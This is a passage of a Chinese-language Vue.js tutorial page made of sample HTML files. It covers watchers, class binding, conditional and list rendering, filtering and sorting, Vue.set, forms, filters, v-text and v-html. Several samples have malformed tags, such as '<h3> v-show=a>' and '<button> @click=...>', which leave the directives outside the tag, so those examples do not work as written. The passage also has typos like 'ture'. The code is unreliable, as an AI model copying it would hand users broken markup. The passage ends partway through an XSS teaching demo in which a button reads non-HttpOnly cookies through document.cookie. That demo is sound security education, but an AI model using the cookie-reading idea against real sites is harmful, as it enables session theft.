          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            input{
              height: 31px;
              width: 310px;
            }
            div{
              width: 310px;
              margin: 0px auto;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1&gt;今天天气? {{ hot ? '针不戳' : '鬼天气' }}&lt;/h1&gt;
            &lt;h1&gt;计算属性 - 今天天气? {{ chot }}&lt;/h1&gt;
            &lt;button @click="change"&gt;切换天气&lt;/button&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                hot: true,
              },
              methods:{
                change() {
                  this.hot = !this.hot;
                }
              },
              computed:{
                chot (){
                  return this.hot ? '针不戳' : '鬼天气'
                }
              },
              watch:{
                //这里写你要监视的属性
                hot:{
                  //immediate会在初始化的时候就编译一下handler
                  immediate: true,
                  //开启深度监视
                  deep: true,
                  //handler,一个回调函数,监听到变化时会自动执行的函数
                  handler(newValue,oldValue){
                    console.log('变天了',newValue,oldValue);
                  }
                },
                //同计算属性,当年不需要其他配置项时(immediate和deep),可以简写
                hot(newValue,oldValue){
                  console.log('变天了',newValue,oldValue);
                }
              }
            })
      
            //第二种写法,通过api调用
            vm.$watch('hot',{
              immediate: true,
              deep: true,
              handler(newValue,oldValue){
                console.log('变天了',newValue,oldValue);
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 12 12/30 -->
    <h2>样式绑定 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 310px;
              height: 310px;
              margin: 0px auto;
            }
            .root{
              background-color: rgb(160, 160, 160);
            }
            .root1{
              border: 5px solid aqua;
            }
            .root2{
              border: 5px solid rgb(255, 0, 0);
            }
            .root3{
              border: 5px solid rgb(0, 255, 42);
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root" class="root" v-on:click="on" v-bind:class="a"&gt;&lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                a:'root1'
              },
              methods:{
                //用普通的判断来完成确定数量和确定样式的绑定
                //用数组可以完成不确定数量的绑定
                //用对象可以完成不确定数量和不确定样式的绑定
                on(){
                  if (this.a == 'root3') {
                    this.a = 'root1';
                    return;
                  }
                  if (this.a == 'root1') {
                    this.a = 'root2';
                  }else{
                    this.a = 'root3';
                    return;
                  }
                }
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 13 12/30 -->
    <h2>条件渲染 v-if <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1031px;
              height: 700px;
              margin: 0px auto;
            }
            .root{
              background-color: rgb(160, 160, 160);
            }
            .root1{
              border: 5px solid aqua;
            }
            h3{
              text-align: center;
            }
            h1{
              font-size: 30px;
              text-align: center;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root" class="root root1"&gt;
            &lt;h3&gt; v-show=a&gt;{{ name }}&lt;/h3&gt;
            &lt;h3&gt; v-show="1 == 1"&gt;{{ name }}&lt;/h3&gt;
            &lt;h3&gt; v-show="1 == 2"&gt;{{ name }}&lt;/h3&gt;&lt;br&gt;&lt;br&gt;
      
            &lt;h3&gt; v-if=a&gt;{{ name }}&lt;/h3&gt;
            &lt;h3&gt; v-if="1 == 1"&gt;{{ name }}&lt;/h3&gt;
            &lt;h3&gt; v-if="1 == 2"&gt;{{ name }}&lt;/h3&gt;&lt;br&gt;&lt;br&gt;
      
            &lt;h1&gt; v-on:click= "n++"&gt;点我: {{ n }}&lt;/h1&gt;
            &lt;h3 v-if="n == 1"&gt;1&lt;/h3&gt;
            &lt;h3&gt; v-else-if="n == 2"&gt;2&lt;/h3&gt;
            &lt;h3&gt; v-else-if="n == 3"&gt;3&lt;/h3&gt;
            &lt;h3&gt; v-else&gt;我是else&lt;/h3&gt;&lt;br&gt;&lt;br&gt;
      
            &lt;!-- template不影响布局,但只能和v-if配合 --&gt;
            &lt;template v-if="1 == 1"&gt;
              &lt;h3&gt;打开控制台你会发现template不见了&lt;/h3&gt;
              &lt;h3&gt;打开控制台你会发现template不见了&lt;/h3&gt;
              &lt;h3&gt;打开控制台你会发现template不见了&lt;/h3&gt;
              &lt;h3&gt;打开控制台你会发现template不见了&lt;/h3&gt;
            &lt;/template&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                name: 
                '打开控制台会发现,v-show="1==2"渲染了,只是用了display:none隐藏了,\
                而v-if="1==2"直接就没有渲染,在某些情况下,v-if的效率更高,但是在某些情况,\
                v-if会导致元素无法获取到',
                a: 'ture',
                n: 1,
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;      
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 14 12/30 -->
    <h2>列表渲染 v-for <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1031px;
              height: 700px;
              margin: 0px auto;
            }
            .root{
              background-color: rgb(160, 160, 160);
            }
            .root1{
              border: 5px solid aqua;
            }
            h3{
              text-align: center;
            }
            h1{
              font-size: 30px;
              text-align: center;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root" class="root root1"&gt;
            &lt;!-- 遍历数组 --&gt;
            &lt;ul&gt;
              &lt;!-- 
              index是对象自带的下标,可以随p(数组中的对象)一起获取,key相当于是标识符,为了给Vue定位元素而设置的,
              key提高效率的同时,还能保证数据不容易出错,key要用唯一标识符,如果不写key,默认添加index为key
               --&gt;
              &lt;li v-for="(p,index) in n" :key="p.id"&gt;{{index}} --- {{p.id}} --- {{p.name}} --- {{p.age}}&lt;/li&gt;
            &lt;/ul&gt;
      
            &lt;!-- 遍历对象 --&gt;
            &lt;ul&gt;
              &lt;!-- 
              index是对象自带的下标,可以随p(数组中的对象)一起获取,key相当于是标识符,为了给Vue定位元素而设置的,
              key提高效率的同时,还能保证数据不容易出错,key要用唯一标识符,如果不写key,默认添加index为key
               --&gt;
              &lt;li v-for="(p,k) in n2" :key="k"&gt;{{k}} --- {{p}}&lt;/li&gt;
            &lt;/ul&gt;
      
            &lt;!-- 遍历字符串 --&gt;
            &lt;ul&gt;
              &lt;!-- 
              index是对象自带的下标,可以随p(数组中的对象)一起获取,key相当于是标识符,为了给Vue定位元素而设置的,
              key提高效率的同时,还能保证数据不容易出错,key要用唯一标识符,如果不写key,默认添加index为key
               --&gt;
              &lt;li v-for="(p,k) in str"&gt;{{k}} --- {{p}}&lt;/li&gt;
            &lt;/ul&gt;
      
            &lt;!-- 遍历指定次数 --&gt;
            &lt;ul&gt;
              &lt;!-- 
              index是对象自带的下标,可以随p(数组中的对象)一起获取,key相当于是标识符,为了给Vue定位元素而设置的,
              key提高效率的同时,还能保证数据不容易出错,key要用唯一标识符,如果不写key,默认添加index为key
               --&gt;
              &lt;li v-for="(p,k) in 10"&gt;{{k}} --- {{p}}&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                n:[
                  {id:4,name:'张三',age:'18'},
                  {id:3,name:'张四',age:'19'},
                  {id:2,name:'张五',age:'20'},
                  {id:1,name:'张六',age:'21'},
                ],
                n2:{
                  name:'wyz',
                  age:'19',
                  gender:'man',
                },
                str:'wyzszhlzj'
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 15 12/31 -->
    <h2>列表过滤 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 231px;
              height: 210px;
              margin: 0px auto;
            }
            .root{
              background-color: rgb(160, 160, 160);
            }
            .root1{
              border: 5px solid aqua;
            }
            h3{
              text-align: center;
            }
            h1{
              font-size: 30px;
              text-align: center;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root" class="root root1"&gt;
            &lt;!-- watch写法 --&gt;
            &lt;input type="text" placeholder="请输入名字" v-model:val='keyword'&gt;
            &lt;ul&gt;
              &lt;li v-for="(p,index) in perspn" :key="p.id"&gt;
                {{p.name}} ---- {{p.age}} ---- {{p.sex}} ---- {{p.gender}}
              &lt;/li&gt;
            &lt;/ul&gt;
      
            &lt;!-- computed写法 --&gt;
            &lt;input type="text" placeholder="请输入名字" v-model:val='keyword2'&gt;
            &lt;ul&gt;
              &lt;li v-for="(p,index) in pons" :key="p.id"&gt;
                {{p.name}} ---- {{p.age}} ---- {{p.sex}} ---- {{p.gender}}
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                perspns:[
                  {id:4,name:'张三',age:'18',sex:"male",gender:'man'},
                  {id:3,name:'张四',age:'19',sex:"male",gender:'man'},
                  {id:2,name:'张五',age:'20',sex:"male",gender:'man'},
                  {id:1,name:'张六',age:'21',sex:"male",gender:'man'},
                ],
                perspn:[],
                keyword: '',
                keyword2: '',
              },
              //computed写法
              computed:{
                pons(){
                  return this.perspns.filter(p=&gt;{
                    return p.name.indexOf(this.keyword2) !== -1;
                  })
                }
              },
              //watch写法
              watch:{
                keyword:{
                  //先执行一遍,因为任何字符串都含有空字符,所以可以显示出列表的全部数据
                  immediate:true,
                  handler(val){
                    this.perspn = this.perspns.filter(p=&gt;{
                      return p.name.indexOf(val) !== -1;
                    })
                  }
                }
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 16 12/31 -->
    <h2>列表排序 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 531px;
              height: 310px;
              margin: 0px auto;
            }
            .root{
              background-color: rgb(160, 160, 160);
            }
            .root1{
              border: 5px solid aqua;
            }
            h3{
              text-align: center;
            }
            h1{
              font-size: 30px;
              text-align: center;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root" class="root root1"&gt;
            &lt;input type="text" placeholder="请输入名字" v-model:val='keyword'&gt;
            &lt;button&gt; @click="sortType = 2"&gt;查询年龄升序&lt;/button&gt;
            &lt;button&gt; @click="sortType = 1"&gt;查询年龄降序&lt;/button&gt;
            &lt;button&gt; @click="sortType = 0"&gt;查询年龄原序&lt;/button&gt;
            &lt;ul&gt;
              &lt;li&gt; v-for="(p,index) in pons" :key="p.id"&gt;
                {{p.name}} ---- {{p.age}} ---- {{p.sex}} ---- {{p.gender}}
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                perspns:[
                  {id:4,name:'张三',age:'31',sex:"male",gender:'man'},
                  {id:3,name:'张四',age:'14',sex:"male",gender:'man'},
                  {id:2,name:'张五',age:'15',sex:"male",gender:'man'},
                  {id:1,name:'张六',age:'61',sex:"male",gender:'man'},
                  {id:6,name:'李五',age:'55',sex:"male",gender:'man'},
                  {id:7,name:'李四',age:'44',sex:"male",gender:'man'},
                  {id:8,name:'李三',age:'33',sex:"male",gender:'man'},
                  {id:9,name:'李六',age:'66',sex:"male",gender:'man'},
                ],
                keyword: '',
                sortType: 0, //0:原序、1:降序、2:升序
              },
              methods:{
                
              },
              computed:{
                pons(){
                  // a就是perspns里的各各对象,filter匹配到的对象将组成一个新的数组,然后传给arr保存
                  // console.log(a);
                  const arr = this.perspns.filter(a=&gt;{
                    //返回匹配到的字符或字符串的位置
                    // console.log(a.name.indexOf(this.keyword));
                    return a.name.indexOf(this.keyword) !== -1;
                  })
                  //只要sortType为ture
                  if (this.sortType) {
                    //排序函数,直接改变原数组
                    arr.sort((p1,p2)=&gt;{
                      // console.log(p1.age);
                      // console.log(p2.age);
                      return this.sortType === 1 ? p2.age - p1.age : p1.age - p2.age;
                    })
                  }
                  //排序后的新数组返回给调用者
                  return arr;
                }
              },
              watch:{
      
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;      
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 17 1/5 -->
    <h2>Vue更新时的一个问题 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 651px;
              height: 510px;
              margin: 0px auto;
            }
            .root{
              background-color: rgb(160, 160, 160);
            }
            .root1{
              border: 5px solid aqua;
            }
            h3{
              text-align: center;
            }
            h1{
              font-size: 30px;
              text-align: center;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root" class="root root1"&gt;
            &lt;h3&gt;打开Vue开发者工具,然后点击下面的按钮,查询张三信息是否改变&lt;/h3&gt;
            &lt;button @click="update"&gt;点击改变张三的个人信息&lt;/button&gt;
            &lt;ul&gt;
              &lt;li v-for="(p,index) in perspns" :key="p.id"&gt;
                {{p.name}} ---- {{p.age}} ---- {{p.sex}} ---- {{p.gender}} ---- {{p.hobby}}
              &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h3 style="display: none;"&gt;看不见看不见&lt;/h3&gt;
            &lt;button style="display: none;" @click="add" &gt;点击我再看看&lt;/button&gt;
            &lt;h3 style="display: none;"&gt;看不见看不见&lt;/h3&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                perspns:[
                  {id:4,name:'张三',age:'31',sex:"male",gender:'man'},
                  {id:3,name:'张四',age:'14',sex:"male",gender:'man'},
                  {id:2,name:'张五',age:'15',sex:"male",gender:'man'},
                  {id:1,name:'张六',age:'61',sex:"male",gender:'man'},
                ],
              },
              methods:{
                update(){
                  document.getElementById('root').childNodes[6].innerHTML =
                  '你应该在Console里面发现了我打印的perspns[0],但是为什么Vue模板没有更新呢?\
                  在控制台获取vm对象里面的perspns你就会发现,虽然data和_data里面张三所在的对象\
                  确实已经被替换为一个全新的对象,但是这也导致了原本Vue对这个对象所做的数据代理\
                  和数据劫持也全部被替换,没有了数据代理,Vue就监测不到数据的变动,自然不会更新模板';
                  document.getElementById('root').childNodes[6].style.display = 'block';
                  document.getElementById('root').childNodes[8].style.display = 'block';
      
                  console.log(this.perspns[0]);
                  this.perspns[0] = {id:4,name:'法外三',age:'23',sex:"male",gender:'man'},  
                  console.log(this.perspns[0]);
                },
                add(){
                  //给对象添加
                  Vue.set(this.perspns[2],'hobby','tea');//是同一个api,只是不同写法
                  this.$set(this.perspns[3],'hobby','tea');//是同一个api,只是不同写法
      
                  //给数组添加
                  //Vue.set
                  Vue.set(this.perspns,'4',{id:5,name:'张七',age:'71',sex:'male',gender:'man'});
                  //Vue包装过的push
                  this.perspns.push({id:6,name:'张八',age:'81',sex:'male',gender:'man'});
      
                  document.getElementById('root').childNodes[10].style.display = 'block';
                  document.getElementById('root').childNodes[10].innerHTML =
                  '你会发现我新增了张七、张八,给张五,张六增添了hobby: tea,\
                  并且张三改的名也正确的显示了,\
                  仔细看源码你会发现我之前的修改按钮使用的是操控dom的方式来给页面增添新东西\
                  因为这样才不会使Vue更新模板,导致张三改名成功,\
                  而"点击我再看看"这个按钮用的是Vue.set,这就是张三改名成功的原因所在,\
                  因为Vue.set会让Vue重新对比解析data的内容,导致你的修改被发现了,\
                  但是也只是仅仅被发现而已,Vue不会在对他做数据代理和数据劫持,\
                  你之前的修改并没有成功"转正",Vue只是重新对比解析data的内容\
                  所以张三就改名成功了,当然,能让Vue重新解析模板的方法不止这一个,你都可以尝试尝试\
                  但是,Vue.set也不是万能的,他不能给vm实例和data这个根数据对象添加新东西,所以要绕开\
                  这两个元素,选择data内的对象或数组为模板的内容\
                  想要增加响应式的内容,还是需要Vue.set和Vue包装过的七个数组方法。';
                }
              },
              computed:{
      
              },
              watch:{
      
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p style="font-size: 20px;">
      vue监视数据的原理:<br>
        1. vue会监视data中所有层次的数据。<br>
        <br>
        2．如何监测对象中的数据?<br>
          通过setter实现监视,且要在new Vue时就传入要监测的数据。<br>
            (1).对象中后追加的属性,Vue默认不做响应式处理<br>
            (2).如需给后添加的属性做响应式,请使用如下API:<br>
              Vue.set(target,propertyName/index.value）或
              vm.$set(target.propertyName/index,value)<br>
        <br>
        3．如何监测数组中的数据?<br>
          通过包裹数组更新元素的方法实现,本质就是做了两件事:<br>
            (1).调用原生对应的方法对数组进行更新。<br>
            (2).重新解析模板,进而更新页面。<br>
        <br>
        4.在Vue修改数组中的某个元素一定要用如下方法:<br>
          1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()<br>
          2.vue.set()或vm.$set()<br>
        <br>
        特别注意:Vue.set()和 vm.$set(）不能给vm 或 vm的根数据对象添加属性!!<br>
    </p>
    
    <hr>
    <!-- 18 1/5 -->
    <h2>v-model的修饰符和表单收集数据 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 950px;
              height: 900px;
              margin: 0px auto;
              background-color: azure;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;form @submit.prevent="rua"&gt;
              &lt;label for="Identification"&gt;账号:&lt;/label&gt;
              &lt;input type="text" id="Identification" v-model.trim="Identification" autocomplete="off"&gt;&lt;br&gt;&lt;br&gt;
              &lt;label for="Password"&gt;密码:&lt;/label&gt;
              &lt;input type="password" id="Password" v-model="Password"&gt;&lt;br&gt;&lt;br&gt;
              &lt;label for="Number"&gt;年龄:&lt;/label&gt;
              &lt;input type="number" id="Number" v-model.number="Number"&gt;&lt;br&gt;&lt;br&gt;
              性别:
              男&lt;input type="radio" name="sex" v-model="sex" value="m"&gt;
              女&lt;input type="radio" name="sex" v-model="sex" value="w"&gt;&lt;br&gt;&lt;br&gt;
              爱好:
              吃&lt;input type="checkbox" v-model="hobby" value="c"&gt;
              喝&lt;input type="checkbox" v-model="hobby" value="h"&gt;
              睡&lt;input type="checkbox" v-model="hobby" value="s"&gt;&lt;br&gt;&lt;br&gt;
              所属校区:
              &lt;select v-model="city"&gt;
                &lt;option value="请选择"&gt;请选择&lt;/option&gt;
                &lt;option value="a"&gt;a&lt;/option&gt;
                &lt;option value="b"&gt;b&lt;/option&gt;
                &lt;option value="c"&gt;c&lt;/option&gt;
                &lt;option value="d"&gt;d&lt;/option&gt;
                &lt;option value="e"&gt;e&lt;/option&gt;
                &lt;option value="f"&gt;f&lt;/option&gt;
              &lt;/select&gt;&lt;br&gt;&lt;br&gt;
              其他信息:
              &lt;textarea name="" id="" cols="30" rows="10" v-model.lazy="other"&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;
              &lt;input type="checkbox" v-model="agree"&gt;阅读并接受&lt;a href="./index.html"&gt;《用户协议》&lt;/a&gt;&lt;br&gt;&lt;br&gt;
              &lt;button&gt;提交&lt;/button&gt;
            &lt;/form&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                Identification:'',
                Password:'',
                Number:'',
                sex:'m',
                hobby:[],
                city:"请选择",
                other:'',
                agree:'',
              },
              methods:{
                rua(){
                  console.log(this.Identification);
                  console.log(this.Password);
                  console.log(this.Number);
                  console.log(this.sex);
                  console.log(this.hobby);
                  console.log(this.city);
                  console.log(this.other);
                  console.log(this.agree);
                }
              },
              computed:{
      
              },
              watch:{
      
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 19 1/8 -->
    <h2>过滤器 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 950px;
              margin: 0px auto;
              background-color: rgb(154, 241, 151);
              font-size: 20px;
            }
            p{
              margin: 18px 0px;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;p&gt;总毫秒数（但是以0代替毫秒具体值） —————— {{ time1 }}&lt;/p&gt;
            &lt;p&gt;总毫秒数 —————— {{ time2 }}&lt;/p&gt;
            &lt;p&gt;总毫秒数 —————— {{ time3 }}&lt;/p&gt;
            &lt;p&gt;年 —————— {{ time4 }}&lt;/p&gt;
            &lt;p&gt;月 —————— {{ time5 }}&lt;/p&gt;
            &lt;p&gt;日 —————— {{ time6 }}&lt;/p&gt;
            &lt;p&gt;星期几(0是日) —————— {{ time7 }}&lt;/p&gt;
            &lt;p&gt;时 —————— {{ time9 }}&lt;/p&gt;
            &lt;p&gt;分 —————— {{ time10 }}&lt;/p&gt;
            &lt;p&gt;秒 —————— {{ time11 }}&lt;/p&gt;
            &lt;p&gt;毫秒 —————— {{ time12 }}&lt;/p&gt;
            &lt;p&gt;xxxx/xx/xx —————— {{ time13 }}&lt;/p&gt;
            &lt;p&gt;x午xx:xx:xx —————— {{ time14 }}&lt;/p&gt;
            &lt;p&gt;xxxx/xx/xx x午xx:xx:xx —————— {{ time15 }}&lt;/p&gt;&lt;br&gt;
            &lt;p&gt;Vue的计算属性实现时间&lt;/p&gt;
            &lt;p&gt;{{ computedtime }}&lt;/p&gt;
            &lt;p&gt;Vue的methods实现时间&lt;/p&gt;
            &lt;p&gt;{{ methodstime() }}&lt;/p&gt;
            &lt;p&gt;Vue的过滤器实现时间&lt;/p&gt;
            &lt;p&gt;{{ time2 | zdymc }}&lt;/p&gt;
            &lt;p&gt;es6形参默认值&lt;/p&gt;
            &lt;p&gt;{{ time2 | zdymc('如果有传参,那就使用传参,如果没有传参,就使用默认值') }}&lt;/p&gt;
            &lt;p&gt;Vue的过滤器还可以连写&lt;/p&gt;
            &lt;p&gt;{{ time2 | zdymc | zdymc2 }}&lt;/p&gt;
            &lt;p&gt;Vue的全局过滤器&lt;/p&gt;
            &lt;p&gt;{{ time2 | 这里是自定义名称 }}&lt;/p&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            Vue.filter('这里是自定义名称',function(value,wyz='我就是全局过滤器,全局语句必须写在第一个new Vue的前面'){
              return `${wyz}。过滤器除了可以用在插值语法中,还能用在v-bind中,再其他好像就不行了`
            })
      
            const vm = new Vue({
              el: '#root',
              data: {
                Day:['星期日','星期一','星期二','星期三','星期四','星期五','星期六'],
                time1:Date.parse(new Date()),
                time2:(new Date()).valueOf(),
                time3:new Date().getTime(),
                time4:new Date().getFullYear(),
                time5:new Date().getMonth()+1,
                time6:new Date().getDate(),
                time7:new Date().getDay(),
                time9:new Date().getHours(),
                time10:new Date().getMinutes(),
                time11:new Date().getSeconds(),
                time12:new Date().getMilliseconds()  ,
                time13:new Date().toLocaleDateString(),
                time14:new Date().toLocaleTimeString(),
                time15:new Date().toLocaleString(),
              },
              methods:{
                methodstime(){
                  return `${new Date().getFullYear()}年${new Date().getMonth()+1}月${new Date().getDate()}日`
                }
              },
              computed:{
                computedtime(){
                  return `${new Date().getFullYear()}年${new Date().getMonth()+1}月${new Date().getDate()}日`
                }
              },
              watch:{
      
              },
              filters:{ //这里的过滤器是局部过滤器,在以后的组件中,组件与组件之间的作用域是不同的,全局过滤器在上面
                zdymc(value,xxx='我就是默认值'){  // zdymc = 自定义名称, 由zdymc:function(){}简写
                //zdymc可以接受两个参数,value接收的必定是 | 前的那个参数（time2）
                //xxx为zdymc()内的参数,也就是es6的形参默认值, return将会覆盖整个插值语法块
                  return `${xxx}  ${new Date().getFullYear()}年${new Date().getMonth()+1}月${new Date().getDate()}日`
                },
                zdymc2(value,xxx='连写很好理解,就是将上一个过滤器的return再次塞进一个过滤器当中'){
                  return `${xxx}  ${value.slice(8,13)}`
                }
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 20 1/8 -->
    <h2>v-text <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 950px;
              margin: 0px auto;
              background-color: rgb(154, 241, 151);
              font-size: 20px;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;div&gt;你好,{{ name }}&lt;/div&gt;
            &lt;div v-text='name'&gt;我写不写都一样,反正你看不到&lt;/div&gt;
            &lt;!-- v-text会替代整个标签的内容 --&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
      
            const vm = new Vue({
              el: '#root',
              data: {
                name:'wyz',
              },
              methods:{
              },
              computed:{
              },
              watch:{
              },
              filters:{ 
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>
    
    <hr>
    <!-- 21 1/10 -->
    <h2>v-html <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            div{
              width: 1050px;
              margin: 0px auto;
              background-color: rgb(154, 241, 151);
              font-size: 20px;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;div&gt;你好,{{ name }}&lt;/div&gt;
            &lt;div v-html='name2'&gt;我写不写都一样,反正你看不到&lt;/div&gt;
            &lt;!-- 跟v-text相比,v-html会解析标签,并且也会替代整个标签的内容 --&gt;
            &lt;p&gt;跟v-text相比,v-html会解析标签,并且也会替代整个标签的内容&lt;/p&gt;
            &lt;p&gt;注意! 任何动态渲染任何html是很危险的,这可能会导致xss攻击&lt;/p&gt;
            &lt;h1&gt;xss攻击,安全隐患! &lt;/h1&gt;
            &lt;p&gt;为了演示,假装,我这个页面是有登录系统的(去application=&gt;cookies里双击随便写点东西)&lt;/p&gt;
            &lt;button @click="add" style="width: 310px; height: 50px; font-size: 31px;"&gt;按我添加cookie信息&lt;/button&gt;
            &lt;p&gt;可以看到,假cookie已经被添加进网页了&lt;/p&gt;
            &lt;p&gt;
              注意观看,cookie里有一项参数叫HttpOnly,如果cookie的这一项打钩了,客户端脚本将无法访问cookie,
              cookie就不会被document.cookie取到值（一般来说,后台都会对重要参数的HttpOnly打上√）,
              很显然,我们没打,因此你可以通过下面这个按钮获取到我们这个页面的cookie
            &lt;/p&gt;
            &lt;button @click="add2" style="width: 510px; height: 50px; font-size: 31px;"&gt;获取当前页面的cookie信息&lt;/button&gt;
            &lt;p&gt;现在你应该在console里看到了之前我们添加的假cookie&lt;/p&gt;
